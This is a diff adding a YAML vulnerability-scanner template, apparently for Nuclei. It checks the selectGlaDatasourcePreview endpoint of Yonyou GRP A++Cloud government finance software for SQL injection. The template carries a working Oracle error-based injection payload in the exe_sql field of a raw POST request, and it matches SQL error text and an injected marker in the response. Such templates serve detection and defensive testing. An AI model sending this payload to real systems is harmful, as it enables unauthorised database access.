@@ -1,0 +1,27 @@
+id: useyonggrp-cloud-selectgladatasourcepreview-sqli
+info:
+  name: 用友GRP A++Cloud政府财务云 selectGlaDatasourcePreview SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a potential SQL injection vulnerability in the 用友GRP A++Cloud政府财务云 selectGlaDatasourcePreview endpoint.
+http:
+  - raw:
+      - |
+        POST /gla/dataSource/selectGlaDatasourcePreview HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        exe_sql=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (2867=2867) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "java.sql.SQLException"
+          - "qzkjq1qbvkq"
+          - "SQL state"
